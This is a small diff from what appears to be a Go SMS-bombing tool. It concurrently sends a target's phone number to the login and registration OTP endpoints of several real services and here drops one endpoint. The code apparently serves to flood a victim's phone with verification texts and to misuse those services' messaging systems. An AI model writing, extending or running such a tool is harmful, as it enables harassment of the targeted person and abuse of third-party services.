@@ -369,9 +369,6 @@ func main() {
 		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // edit :4/22/2025
 		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
 			"UserName": phone,
 		}, ch)  // edit :4/22/2025
